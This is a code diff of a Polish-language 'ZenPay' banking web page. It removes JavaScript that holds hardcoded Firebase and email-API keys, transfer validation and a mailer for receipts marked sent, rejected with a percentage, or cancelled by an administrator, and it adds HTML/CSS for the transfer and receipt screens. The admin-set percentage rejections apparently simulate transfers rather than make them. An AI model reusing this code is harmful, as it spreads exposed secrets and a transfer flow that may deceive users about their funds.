@@ -1,2458 +1,1486 @@
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-import { getDatabase, ref, get, onValue, update, push, set } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNlEk",
-  authDomain: "vantex-admin-2026.firebaseapp.com",
-  databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
-  projectId: "vantex-admin-2026",
-  storageBucket: "vantex-admin-2026.firebasestorage.app",
-  messagingSenderId: "810884502320",
-  appId: "1:810884502320:web:b8ba7c2909ddf4ccf02ef5"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-
-await import("https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js").then(m=>m.signInAnonymously(m.getAuth(app)));
-
-let user = null;
-let currentHistory = [];
-let historyListener = null;
-let balanceListener = null;
-let statusListener = null;
-let sessionId = null;
-let refreshInProgress = false;
-let banqueRef = null;
-let bannerTimer = null;
-
-// ===== FIELD ERROR UTILITIES =====
-function showFieldError(fieldId, message) {
-  const errorEl = document.getElementById('error-' + fieldId);
-  const inputEl = document.getElementById(fieldId);
-  if (errorEl) {
-    errorEl.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#f97316;font-size:16px;flex-shrink:0;"></i><span>' + message + '</span>';
-    errorEl.classList.add('visible');
-  }
-  if (inputEl) {
-    inputEl.classList.add('input-error');
-    const wrapper = inputEl.closest('.input-wrapper');
-    if (wrapper) {
-      const parentGroup = wrapper.closest('.field-group, .verify-code-section');
-      if (parentGroup) parentGroup.classList.add('has-error');
-    }
-  }
-}
-
-function clearFieldError(fieldId) {
-  const errorEl = document.getElementById('error-' + fieldId);
-  const inputEl = document.getElementById(fieldId);
-  if (errorEl) {
-    errorEl.innerHTML = '';
-    errorEl.classList.remove('visible');
-  }
-  if (inputEl) {
-    inputEl.classList.remove('input-error');
-    const wrapper = inputEl.closest('.input-wrapper');
-    if (wrapper) {
-      const parentGroup = wrapper.closest('.field-group, .verify-code-section');
-      if (parentGroup) parentGroup.classList.remove('has-error');
-    }
-  }
-}
-
-function clearAllTransferErrors() {
-  ['a', 'b', 'c', 'd', 'e', 'f'].forEach(id => clearFieldError(id));
-}
-
-function validateTextField(fieldId, emptyMessage) {
-  const input = document.getElementById(fieldId);
-  if (!input) return true;
-  if (!input.value.trim()) {
-    showFieldError(fieldId, emptyMessage);
-    return false;
-  }
-  clearFieldError(fieldId);
-  return true;
-}
-
-function validateAmountField() {
-  const input = document.getElementById('a');
-  const continueBtn = document.getElementById('continueBtn');
-  if (!input) return false;
-
-  const raw = input.value;
-
-  // Champ vide
-  if (!raw || raw.trim() === '') {
-    showFieldError('a', 'Proszę wpisać kwotę przelewu.');
-    if (continueBtn) continueBtn.disabled = true;
-    return false;
-  }
-
-  // Contient des espaces
-  if (raw.includes(' ')) {
-    const cleaned = raw.replace(/\s/g, '');
-    const example = cleaned || 'np. 3000';
-    showFieldError('a', `Proszę usunąć spacje. Poprawny format: ${example}`);
-    if (continueBtn) continueBtn.disabled = true;
-    return false;
-  }
-
-  // Contient des caractères non numériques (virgule, point, lettres, etc.)
-  if (!/^\d+$/.test(raw)) {
-    const digitsOnly = raw.replace(/[^0-9]/g, '');
-    const hasComma = raw.includes(',');
-    const hasDot = raw.includes('.');
-    const hasDecimal = /[,\.]\d{2}$/.test(raw);
-
-    let message = 'Proszę wpisać kwotę wyłącznie cyframi.';
-    if (digitsOnly) {
-      message += ` Poprawny format: ${digitsOnly}.`;
-      if (hasDecimal) {
-        message += ' Usuń część dziesiętną (np. ,00).';
-      } else if (hasComma || hasDot) {
-        message += ' Usuń separator.';
-      }
-    } else {
-      message += ' Na przykład: 13000';
-    }
-    showFieldError('a', message);
-    if (continueBtn) continueBtn.disabled = true;
-    return false;
-  }
-
-  // Montant numérique valide — vérifier le solde
-  const amt = Number(raw);
-  if (user && amt > Number(user.montant)) {
-    showFieldError('a', `Kwota przekracza dostępne saldo (${fmt(user.montant)}).`);
-    if (continueBtn) continueBtn.disabled = true;
-    return false;
-  }
-
-  clearFieldError('a');
-  if (continueBtn) {
-    const allFilled = ['b','c','d','e','f'].every(id => {
-      const el = document.getElementById(id);
-      return el && el.value.trim() !== '';
-    });
-    continueBtn.disabled = !allFilled;
-  }
-  return true;
-}
-
-function validateAllTransferFields() {
-  let ok = true;
-  ok = validateAmountField() && ok;
-  ok = validateTextField('b', 'Proszę wpisać imię i nazwisko beneficjenta.') && ok;
-  ok = validateTextField('c', 'Proszę wpisać numer IBAN lub konta.') && ok;
-  ok = validateTextField('d', 'Proszę wpisać kod BIC/SWIFT.') && ok;
-  ok = validateTextField('e', 'Proszę wpisać nazwę banku.') && ok;
-  ok = validateTextField('f', 'Proszę wpisać powód przelewu.') && ok;
-  return ok;
-}
-
-function setupCodeValidation() {
-  const codeInput = document.getElementById('code');
-  if (!codeInput) return;
-
-  // Dès que l'utilisateur commence à taper, on efface le message d'erreur
-  codeInput.addEventListener('input', function() {
-    clearFieldError('code');
-  });
-}
-
-function initCodeField() {
-  const codeInput = document.getElementById('code');
-  if (codeInput) {
-    codeInput.value = '';
-    clearFieldError('code');
-    // Optionnel : focus automatique sur le champ
-    // codeInput.focus();
-  }
-}
-
-
-
-// ===== API D'ENVOI D'EMAILS =====
-const API_URL = 'https://getzenpay-email-api.onrender.com/api/send-welcome';
-const API_KEY = 'GETZENPAY_2026_SECRET';
-
-function generateRandomCode(length = 4) {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-  let result = '';
-  for (let i = 0; i < length; i++) {
-    result += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return result;
-}
-
-const TIME_ZONE = 'Europe/Warsaw';
-
-function getPolandDateTime() {
-  const now = new Date();
-  const dateStr = now.toLocaleDateString('pl-PL', {
-    timeZone: TIME_ZONE,
-    day: '2-digit',
-    month: '2-digit',
-    year: 'numeric'
-  });
-  const timeStr = now.toLocaleTimeString('pl-PL', {
-    timeZone: TIME_ZONE,
-    hour: '2-digit',
-    minute: '2-digit'
-  });
-  return { dateStr, timeStr, timestamp: now.getTime(), now };
-}
-
-const sendMail = async ({ to, name, pct, success, montant, beneficiaire, compte, reference, isRefund = false }) => {
-  try {
-    const suffixe = generateRandomCode();
-    const { dateStr, timeStr } = getPolandDateTime();
-
-    let sujet;
-    if (isRefund) {
-      sujet = `${suffixe} ${name} - Twój przelew został anulowany`;
-    } else {
-      sujet = success ? `${suffixe} ${name} - Twój przelew został wysłany` : `${suffixe} ${name} - Twój przelew został odrzucony`;
-    }
-
-    let montantFormatted = montant || '0.00 zł';
-    let benef = beneficiaire || '---';
-    let compteAffiche = compte || '---';
-    const ref = reference || '---';
-    let statutLabel, statutColor, statutBg, headerColor, accentColor, messageText, iconChar;
-
-    if (isRefund) {
-      statutLabel = 'ANULOWANY';
-      statutColor = '#DC2626';
-      statutBg = '#FEF2F2';
-      headerColor = '#DC2626';
-      accentColor = '#DC2626';
-      messageText = 'Twój przelew został anulowany przez administratora ZenPay. Środki zostały zwrócone na Twoje konto bankowe.';
-      iconChar = '✕';
-      benef = 'ZenPay';
-      if (compteAffiche && compteAffiche.length > 9) {
-        compteAffiche = compteAffiche.substring(0, 9) + '*********';
-      } else {
-        compteAffiche = 'ZPY916398*********';
-      }
-    } else if (success) {
-      statutLabel = 'ZREALIZOWANY';
-      statutColor = '#059669';
-      statutBg = '#ECFDF5';
-      headerColor = '#0D9488';
-      accentColor = '#10B981';
-      messageText = 'Twoje zlecenie przelewu zostało pomyślnie zrealizowane. Środki zostaną przelane w ciągu 1 do 3 minut po ostatecznej weryfikacji.';
-      iconChar = '✓';
-    } else {
-      statutLabel = 'ODRZUCONY (' + (pct || 0) + '%)';
-      statutColor = '#B45309';
-      statutBg = '#FFFBEB';
-      headerColor = '#D97706';
-      accentColor = '#F59E0B';
-      messageText = 'Twoje zlecenie przelewu zostało odrzucone z powodu nieprawidłowych danych lub przekroczenia limitu. Sprawdź dane i spróbuj ponownie.';
-      iconChar = '!';
-    }
-
-    const footerTextPlain = 'W przypadku pytań lub wątpliwości skontaktuj się z nami: noreply@zenpaybj.xyz';
-
-    const htmlContent = `
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Potwierdzenie przelewu – ZenPay</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>ZenPay</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+  <style>
+    /* ===== RÉINITIALISATION + PLEIN ÉCRAN ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Titillium Web', sans-serif;
+    }
+    html, body {
+      width: 100%;
+      min-height: 100vh;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #f0f2f5;
+      color: var(--text-primary);
+    }
+    body {
+      display: flex;
+      flex-direction: column;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+    :root {
+      --bg: #FFFFFF;
+      --card-bg: #FFFFFF;
+      --border-light: rgba(0, 0, 0, 0.04);
+      --text-primary: #1A1D2E;
+      --text-secondary: #6B7280;
+      --text-muted: #9CA3AF;
+      --shadow-soft: 0 2px 12px rgba(0, 0, 0, 0.03);
+      --shadow-medium: 0 4px 20px rgba(0, 0, 0, 0.04);
+      --radius: 8px;
+      --radius-sm: 4px;
+      --p: #0D9488;
+      --p-light: #CCFBF1;
+      --p-dark: #0F766E;
+      --p-gradient: linear-gradient(135deg, #14B8A6, #0D9488);
+      --p-soft: rgba(13, 148, 136, 0.12);
+    }
+    .screen {
+      display: none;
+      flex: 1;
+      flex-direction: column;
+    }
+    .screen.active {
+      display: flex;
+    }
+    #login.screen .login-wrapper {
+      min-height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 24px;
+      flex: 1;
+      background: #f0f2f5;
+    }
+
+    /* ===== EN-TÊTE FIXE EN HAUT ===== */
+    header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      width: 100%;
+      z-index: 100;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.04);
+      height: 64px;
+    }
+    .logo { display: flex; align-items: center; gap: 10px; font-size: 22px; font-weight: 800; color: var(--p); letter-spacing: -0.5px; }
+    .logo i { font-size: 24px; background: var(--p-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .header-actions { display: flex; gap: 6px; align-items: center; }
+    .badge-icon {
+      width: 44px; height: 44px; border-radius: 14px;
+      background: #F3F4F6; border: 1.5px solid #D1D5DB;
+      display: flex; align-items: center; justify-content: center; color: var(--p-dark);
+      font-weight: 700; font-size: 14px;
+      cursor: pointer; position: relative; box-shadow: 0 2px 10px rgba(13,148,136,0.18);
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .badge-icon:hover { background: #E5E7EB; box-shadow: 0 4px 20px rgba(0,0,0,0.1); transform: translateY(-1px); border-color: #9CA3AF; }
+    .badge-icon i { color: var(--p); font-size: 20px; }
+    .refresh-btn {
+      width: 44px; height: 44px; border-radius: 14px;
+      background: #F3F4F6; border: 1.5px solid #D1D5DB;
+      display: flex; align-items: center; justify-content: center; color: var(--p-dark);
+      cursor: pointer; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); font-size: 20px; box-shadow: 0 2px 10px rgba(13,148,136,0.18);
+    }
+    .refresh-btn:hover { background: #E5E7EB; box-shadow: 0 4px 20px rgba(0,0,0,0.1); transform: translateY(-1px); border-color: #9CA3AF; }
+    .refresh-btn i { color: var(--p); font-size: 20px; }
+    .refresh-btn.spinning i { animation: spin 0.8s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .notif-badge {
+      position: absolute; top: -2px; right: -2px; background: #EF4444; color: #fff; border-radius: 50%;
+      width: 18px; height: 18px; font-size: 9px; font-weight: 600; display: flex; align-items: center;
+      justify-content: center; border: 2px solid #fff;
+    }
+    .notif-badge.hidden { display: none; }
+
+    /* ===== CONTENU PRINCIPAL AVEC MARGE POUR L'EN-TÊTE ===== */
+    main {
+      flex: 1;
+      padding: 16px 14px 40px;
+      background: transparent;
+      width: 100%;
+      max-width: 100%;
+    }
+    .screen:not(#login) main {
+      padding-top: 88px;
+    }
+    @media (min-width: 768px) {
+      main { padding: 20px 40px 60px; }
+      .screen:not(#login) main { padding-top: 88px; }
+    }
+    @media (max-width: 480px) {
+      main { padding: 12px 10px 60px; }
+      .screen:not(#login) main { padding-top: 88px; }
+    }
+
+    /* === ESPACE SUPPLÉMENTAIRE EN BAS DE LA PAGE D'ACCUEIL === */
+    #dashboard main {
+      padding-bottom: 100px;
+    }
+    @media (min-width: 768px) {
+      #dashboard main { padding-bottom: 120px; }
+    }
+    @media (max-width: 480px) {
+      #dashboard main { padding-bottom: 120px; }
+    }
+
+    /* === RÉDUCTION DE L'ESPACE EN BAS POUR VERIFY, PROGRESS, RESULT === */
+    #verify main,
+    #progress main,
+    #result main {
+      flex: 0 0 auto;
+      min-height: auto;
+      padding-bottom: 10px;
+    }
+    @media (min-width: 768px) {
+      #verify main, #progress main, #result main { padding-bottom: 10px; }
+    }
+    @media (max-width: 480px) {
+      #verify main, #progress main, #result main { padding-bottom: 10px; }
+    }
+
+    /* === PANEL DE SOLDE ARRONDI === */
+    .balance-panel {
+      border-radius: 18px !important;
+    }
+
+    /* ===== MODALES ===== */
+    .modal {
+      position: fixed; inset: 0; background: rgba(11, 15, 25, 0.5); backdrop-filter: blur(4px);
+      display: flex; align-items: center; justify-content: center; z-index: 1000; padding: 16px;
+    }
+    .modal.hidden { display: none !important; }
+    .modal-content {
+      background: #FFFFFF; border-radius: var(--radius);
+      max-width: 520px; width: 100%;
+      padding: 20px 20px 16px;
+      position: relative; box-shadow: 0 24px 64px rgba(0,0,0,0.12);
+      max-height: 90vh; overflow-y: auto;
+      overflow: visible;
+    }
+    .modal-close {
+      position: absolute; top: -16px; right: -16px;
+      width: 34px; height: 34px; border-radius: 50%;
+      background: #DC2626; color: #fff; border: 3px solid #fff;
+      font-size: 18px; font-weight: 700; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 4px 16px rgba(220,38,38,0.4);
+      transition: transform 0.2s, box-shadow 0.2s; z-index: 20;
+    }
+    .modal-close:hover { transform: scale(1.1); box-shadow: 0 6px 24px rgba(220,38,38,0.5); }
+    .btn {
+      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+      width: 100%; padding: 12px 18px; background: #2D2D3A; color: #FFFFFF;
+      border: none; border-radius: var(--radius-sm);
+      font-size: 14px; font-weight: 600;
+      cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.15); transition: opacity 0.2s;
+    }
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+    .input {
+      width: 100%; padding: 8px 12px; background: #FAFBFC; border: 1.5px solid #E5E7EB;
+      border-radius: var(--radius-sm);
+      font-size: 13px; color: var(--text-primary);
+    }
+    .input:focus { outline: none; border-color: var(--p); box-shadow: 0 0 0 4px rgba(13,148,136,0.10); background: #fff; }
+    .amount-input-wrap {
+      display: flex; align-items: center; margin: 4px 0 12px;
+    }
+    .amount-input-wrap .input {
+      border-top-right-radius: 0; border-bottom-right-radius: 0;
+      text-align: left; font-weight: 700; font-size: 14px; padding: 8px 12px; flex: 1;
+    }
+    .amount-input-wrap .currency-symbol {
+      padding: 8px 14px; background: #FAFBFC; border: 1.5px solid #E5E7EB;
+      border-left: none; border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+      font-weight: 600; display: flex; align-items: center; justify-content: center;
+      font-size: 13px; color: var(--text-secondary); height: 100%; min-height: 36px; line-height: 1;
+    }
+    #greet {
+      font-size: 26px; font-weight: 600; margin-bottom: 32px;
+      letter-spacing: -0.01em; color: var(--text-secondary);
+      display: flex; align-items: center; flex-wrap: nowrap;
+      gap: 8px; overflow: hidden; white-space: nowrap;
+      padding-left: 4px;
+    }
+    #greet span { color: var(--text-primary); white-space: nowrap; overflow: hidden; flex: 1 1 auto; min-width: 0; font-size: 28px; font-weight: 700; letter-spacing: -0.02em; }
+    .balance-panel {
+      background: var(--p-gradient);
+      padding: 24px 22px 20px;
+      margin-bottom: 32px; color: #fff; position: relative; overflow: hidden;
+      box-shadow: 0 12px 32px rgba(13,148,136,0.20), 0 4px 12px rgba(13,148,136,0.12);
+      display: flex; flex-direction: column;
+      min-height: 180px; border: none;
+    }
+    .balance-panel::before {
+      content: ''; position: absolute; top: -60%; right: -30%; width: 220px; height: 220px;
+      background: rgba(255,255,255,0.06); border-radius: 50%; pointer-events: none;
+    }
+    .balance-panel::after {
+      content: ''; position: absolute; bottom: -40%; left: -20%; width: 160px; height: 160px;
+      background: rgba(255,255,255,0.04); border-radius: 50%; pointer-events: none;
+    }
+    .balance-panel .label {
+      font-size: 11px; letter-spacing: 1px; opacity: 0.75; margin-bottom: 8px;
+      display: flex; align-items: center; gap: 8px; font-weight: 500; text-transform: uppercase;
+    }
+    .balance-panel .amount {
+      font-size: 26px; font-weight: 700; letter-spacing: -0.02em; line-height: 1.2;
+      overflow: visible; white-space: nowrap; margin-bottom: 6px; margin-left: 0;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .balance-panel .sub {
+      font-size: 12px; opacity: 0.65; margin-bottom: 20px; font-weight: 400;
+    }
+    .balance-actions-wrapper {
+      display: flex; gap: 10px; justify-content: space-between; width: 100%; position: relative; z-index: 2; margin-bottom: 0;
+    }
+    .balance-actions-wrapper .btn-action {
+      flex: 1; min-width: 0; background: #E5E7EB; color: #374151; border: 1.5px solid #9CA3AF;
+      border-radius: 14px; padding: 12px 14px; font-size: 13px; font-weight: 700;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      line-height: 1.2; min-height: 44px; text-align: center;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+    }
+    .balance-actions-wrapper .btn-action:hover { background: #D1D5DB; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.15); }
+    .balance-actions-wrapper .btn-action i { color: #374151; font-size: 15px; }
+    .btn-iban {
+      width: 100%; background: #E5E7EB; color: #374151; border: 1.5px solid #9CA3AF;
+      border-radius: 14px; padding: 12px 14px; font-size: 13px; font-weight: 700;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      margin-top: 10px; min-height: 44px; transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+    }
+    .btn-iban:hover { background: #D1D5DB; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.15); }
+    .btn-iban i { color: #374151; font-size: 15px; }
+    .quick-stats {
+      display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin-bottom: 20px;
+    }
+    .stat-item {
+      background: var(--card-bg); border: 1.5px solid #d1d5db; border-radius: 12px;
+      padding: 14px 10px; display: flex; flex-direction: column; align-items: center; justify-content: center;
+      box-shadow: var(--shadow-soft); overflow: visible;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .stat-item:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.06); }
+    .stat-item .stat-value {
+      font-size: 20px; font-weight: 700; color: var(--text-primary); white-space: nowrap; overflow: visible;
+      letter-spacing: -0.02em;
+    }
+    .stat-item .stat-label {
+      font-size: 11px; color: var(--text-secondary); letter-spacing: 0.3px; margin-top: 4px; font-weight: 500;
+    }
+    .stat-item .stat-icon {
+      font-size: 18px; color: var(--p); margin-bottom: 5px; opacity: 0.85;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .history-container {
+      border: 1.5px solid #d1d5db; border-radius: 14px;
+      background: #ffffff; padding: 0;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.03);
+    }
+    .history-header {
+      display: flex; align-items: center; gap: 10px;
+      font-weight: 700; font-size: 15px; color: var(--text-primary);
+      padding: 18px 20px 14px 20px; border-bottom: 2.5px solid var(--p);
+      margin-bottom: 0; background: #ffffff; border-radius: 14px 14px 0 0;
+    }
+    .history-header i { font-size: 18px; color: var(--p); }
+    .history-header .badge-count {
+      margin-left: auto; background: var(--p-soft); color: var(--p); font-size: 11px;
+      font-weight: 700; padding: 4px 10px; border-radius: 20px;
+    }
+    #history-list { padding: 8px 12px 12px 12px; }
+    .history-item {
+      background: #ffffff; border: none;
+      border-radius: 14px;
+      padding: 14px 14px; margin-bottom: 8px;
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 12px; cursor: pointer;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+      width: 100%; min-height: 56px; transition: all 0.2s ease;
+    }
+    .history-item:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.06); background: #fafbfc; transform: translateX(2px); }
+    .history-item:last-child { margin-bottom: 0; }
+    .history-left { display: flex; align-items: center; gap: 12px; min-width: 0; flex: 1 1 auto; }
+    .history-icon {
+      width: 40px; height: 40px; border-radius: 12px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+      font-size: 14px;
+    }
+    .history-icon.credit { background: #D1FAE5; color: #059669; }
+    .history-icon.debit { background: #FEF2F2; color: #DC2626; }
+    .history-icon.refund { background: #EDE9FE; color: #7C3AED; }
+    .history-icon.bank-logo { background: #fff; border: 1.5px solid #e5e7eb; box-shadow: 0 2px 6px rgba(0,0,0,0.06); padding: 4px; }
+    .history-icon.bank-logo img { width: 100%; height: 100%; object-fit: contain; border-radius: 4px; }
+    .history-icon.human-logo { background: linear-gradient(135deg, #E5E7EB, #D1D5DB); border: 2px solid #9CA3AF; color: #4B5563; box-shadow: 0 2px 6px rgba(0,0,0,0.06); }
+.history-icon.custom-bank { background: transparent; border: none; box-shadow: none; padding: 0; }
+    .history-info { min-width: 0; flex: 1 1 auto; display: flex; flex-direction: column; overflow: hidden; }
+    .history-info .title {
+      font-size: 15px; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; line-height: 1.3;
+    }
+    .history-info .title .sub { color: var(--text-secondary); font-weight: 400; }
+    .history-info .meta { font-size: 12px; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-weight: 400; margin-top: 2px; }
+    .history-amount { font-weight: 700; font-size: 15px; white-space: nowrap; flex-shrink: 0; text-align: right; margin-left: auto; line-height: 1.3; }
+    .history-amount.credit { color: #059669; }
+    .history-amount.debit { color: #DC2626; }
+    .history-amount.refund { color: #7C3AED; }
+    .empty-history {
+      text-align: center; color: var(--text-secondary); padding: 40px 20px 30px;
+      background: transparent; border: none; border-radius: 0; font-size: 15px; font-weight: 400;
+    }
+    .empty-history i { display: block; font-size: 40px; color: #e5e7eb; margin-bottom: 12px; }
+    .transfer-card, .progress-card {
+      background: var(--card-bg); border: 1px solid var(--border-light);
+      border-radius: var(--radius); padding: 14px 14px;
+      box-shadow: var(--shadow-soft); max-width: 600px; margin: 0 auto; width: 100%;
+    }
+    .transfer-balance {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 12px; font-size: 13px; color: var(--text-secondary); font-weight: 400;
+    }
+    .transfer-balance b { color: var(--text-primary); font-weight: 600; }
+    .transfer-title {
+      display: flex; align-items: center; gap: 8px; margin-bottom: 14px;
+      font-size: 13px; color: var(--p); font-weight: 600;
+    }
+    .field-group { margin-bottom: 20px; }
+    .field-group label {
+      display: block; font-size: 11px; font-weight: 500; color: var(--text-secondary);
+      margin-bottom: 2px; letter-spacing: 0.3px;
+    }
+
+    /* ===== CHAMPS EN GRAS SUR LA PAGE DE TRANSFERT ===== */
+    #transfer .field-group input {
+      font-weight: 700;
+    }
+    #transfer .amount-input-wrap .input {
+      font-weight: 700;
+    }
+
+    /* ===== MESSAGE D'INFORMATION SUR LE TRANSFERT ===== */
+    .transfer-info {
+      display: flex; align-items: center; gap: 8px;
+      background: #e5e7eb; padding: 8px 12px; border-radius: var(--radius-sm);
+      margin: 6px 0 12px 0;
+      color: #1F2937; font-size: 13px; font-weight: 500; line-height: 1.4;
+    }
+    .transfer-info i { color: #4B5563; font-size: 16px; flex-shrink: 0; }
+
+    /* ===== STYLES SPÉCIFIQUES À LA PAGE DE VÉRIFICATION ===== */
+    .verify-details {
+      background: #f3f4f6; padding: 12px 14px;
+      border-radius: var(--radius-sm); margin-bottom: 12px;
+      border: 1px solid var(--border-light);
+    }
+    .verify-details .row { margin-bottom: 10px; }
+    .verify-details .row:last-child { margin-bottom: 0; }
+    .verify-details .label {
+      font-size: 12px; font-weight: 500; color: var(--text-secondary);
+      letter-spacing: 0.5px; margin-bottom: 3px; display: block;
+    }
+    .verify-details .value {
+      font-weight: 600; font-size: 14px; word-break: break-all; color: var(--text-primary);
+      padding-left: 14px; display: block;
+    }
+    .verify-cancel {
+      padding: 6px 14px; border: 1.5px solid #FCA5A5; color: #EF4444;
+      background: transparent; border-radius: var(--radius-sm);
+      font-size: 12px; font-weight: 500; cursor: pointer;
+    }
+    .verify-code-section { margin-top: 14px; }
+    .verify-code-section .lock-line {
+      display: flex; align-items: center; gap: 8px;
+      font-weight: 500; font-size: 13px; color: var(--text-primary);
+      margin-bottom: 8px;
+    }
+    .verify-code-section .lock-line i { font-size: 14px; color: var(--p); }
+    .verify-code-section .code-input {
+      width: 100%; padding: 8px 12px; background: #FAFBFC;
+      border: 1.5px solid #E5E7EB; border-radius: var(--radius-sm);
+      font-size: 15px; text-align: center; letter-spacing: 4px;
+      font-weight: 600; color: var(--text-primary); margin-bottom: 8px;
+    }
+    .verify-code-section .code-input:focus {
+      outline: none; border-color: var(--p);
+      box-shadow: 0 0 0 4px rgba(13,148,136,0.10); background: #fff;
+    }
+    .verify-code-section .code-input::placeholder {
+      color: #9ca3af;
+      letter-spacing: 4px;
+      font-weight: 400;
+    }
+    .verify-submit {
+      margin-top: 4px;
+    }
+
+    .progress-pill {
+      width: 100%; height: 48px; background: #fff; border: 3px solid var(--p);
+      border-radius: 50px; overflow: hidden; position: relative; margin: 16px 0;
+    }
+    .progress-pill-fill {
+      height: 100%; background: var(--p); border-radius: 50px;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; font-weight: 700; font-size: 16px; min-width: 50px;
+      width: 0%; transition: width 0.15s linear;
+    }
+    .progress-details-box {
+      background: #f3f4f6; border-radius: var(--radius-sm);
+      padding: 12px 14px; margin-top: 12px;
+    }
+    .progress-details .row { display: block; padding: 0; margin-bottom: 8px; font-size: 14px; border-bottom: none; }
+    .progress-details .row:last-child { margin-bottom: 0; }
+    .progress-details .row .label {
+      color: var(--text-secondary); font-weight: 400; display: block; margin-bottom: 2px; font-size: 13px;
+    }
+    .progress-details .row .value {
+      font-weight: 700; color: #1a1a2e; display: block; text-align: left;
+      word-break: break-all; max-width: 100%; font-size: 16px; padding-left: 10px;
+    }
+    .receipt-card {
+      background: #fff; border-radius: var(--radius);
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+      border: 1px solid #e5e7eb; overflow: hidden; width: 100%;
+    }
+    .receipt-header {
+      text-align: center; padding: 24px 20px 16px;
+      border-bottom: 1px dashed #d1d5db; position: relative;
+    }
+    .receipt-badge {
+      display: inline-block; font-size: 10px; color: #6b7280;
+      letter-spacing: 2px; text-transform: uppercase; font-weight: 600; margin-bottom: 10px;
+    }
+    .receipt-icon { font-size: 40px; margin-bottom: 8px; }
+    .receipt-percent { font-size: 32px; font-weight: 800; color: #10B981; margin-bottom: 2px; }
+    .receipt-status { font-size: 16px; font-weight: 700; color: #1a1a2e; }
+    .receipt-body { padding: 16px 24px; }
+    .receipt-row {
+      display: flex; justify-content: space-between; align-items: flex-start;
+      padding: 8px 0; border-bottom: 1px solid #f3f4f6; font-size: 13px;
+    }
+    .receipt-row:last-child { border-bottom: none; }
+    .receipt-row .r-label { color: #6b7280; font-weight: 500; flex-shrink: 0; padding-right: 12px; }
+    .receipt-row .r-value { color: #1a1a2e; font-weight: 600; text-align: right; word-break: break-all; max-width: 60%; }
+    .receipt-row .r-value.amount { font-size: 15px; font-weight: 700; }
+    .receipt-row .r-value.status-tag {
+      display: inline-flex; align-items: center; gap: 4px; color: #059669;
+      font-weight: 600; font-size: 11px; background: #ecfdf5; padding: 3px 10px; border-radius: 20px;
+    }
+    .receipt-footer { padding: 0 24px 20px; }
+    .receipt-msg {
+      background: #f8fafc; border-radius: 8px; padding: 12px 14px;
+      border-left: 3px solid var(--p); font-size: 12px; color: #4b5563;
+      line-height: 1.6; margin-bottom: 14px;
+    }
+    .receipt-btn { background: var(--p-gradient); box-shadow: 0 4px 16px rgba(13,148,136,0.3); }
+    nav {
+      position: fixed; bottom: 12px; left: 16px; right: 16px;
+      background: rgba(255, 255, 255, 0.92); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+      border: 2px solid rgba(0,0,0,0.15);
+      display: grid; grid-template-columns: repeat(4, 1fr);
